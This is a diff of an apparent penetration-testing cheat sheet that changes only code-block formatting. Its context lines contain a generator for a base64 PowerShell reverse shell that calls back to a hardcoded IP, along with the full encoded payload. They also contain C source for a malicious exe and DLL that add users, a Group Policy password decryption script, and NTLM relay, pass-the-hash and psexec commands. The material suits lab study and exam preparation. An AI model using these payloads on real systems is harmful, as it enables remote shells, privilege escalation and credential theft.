@@ -209,7 +209,7 @@ powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5
 
   Generate base64 powershell reverse shell (remember to change IP and PORT)
 
-  #+begin_src python
+  ```python
 import sys
 import base64
 
@@ -218,7 +218,7 @@ payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.10",44
 cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
 return cmd
-  #+end_src
+ ```
 
   #+RESULTS:
   : powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMQAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
@@ -1112,7 +1112,7 @@ runas /user:backupadmin cmd
    Cross-Compilation for malicious exe
     
    Cross compile for windows
-   #+begin_src c
+   ```c
 #include <stdlib.h>
 
 int main ()
@@ -1122,7 +1122,7 @@ int main ()
   return 0;
 }
 
-   #+end_src
+  ```
 
    ```
    x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
@@ -1132,7 +1132,7 @@ int main ()
 
    Cross-Compilation for malicious DLL
 
-   #+begin_src c
+   ```c
 #include <stdlib.h>
 #include <windows.h>
 
@@ -1157,7 +1157,7 @@ BOOL APIENTRY DllMain(
     }
   return TRUE;
 }
-   #+end_src
+  ```
 
    ```
 x86_64-w64-mingw32-gcc adduser_dll.c --shared -o adduser.dll  
@@ -1364,17 +1364,17 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershe
 
     *Groups.xml*
 
-    #+begin_src xml
+    ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
-    #+end_src
+   ```
 
     We can crack the ~cpassword~ with the following python script
 
     *ggp-decrypt.py*
 
-    #+begin_src python
+    ```python
 #!/usr/bin/env python3
 
 from Crypto.Cipher import AES
@@ -1393,16 +1393,16 @@ if __name__ == "__main__":
     plaintext = unpad(plaintext, AES.block_size)
 
     print(plaintext.decode())
-    #+end_src
+   ```
 
     To use the script do the following
 
-    #+begin_src bash
+    ```bash
 python3 -m venv venv
 . venv/bin/activate
 pip3 install pycryptodome
 python3 gpp-decrypt.py
-    #+end_src
+   ```
     
     The key was obtained directly from Microsoft. References:
 
@@ -1536,9 +1536,9 @@ proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
 	```
 
 **** Using impacket-psexec
-     #+begin_src bash
+     ```bash
 impacket-psexec active.htb/administrator@10.10.10.100                                    
-     #+end_src
+    ```
 
      Example execution
 
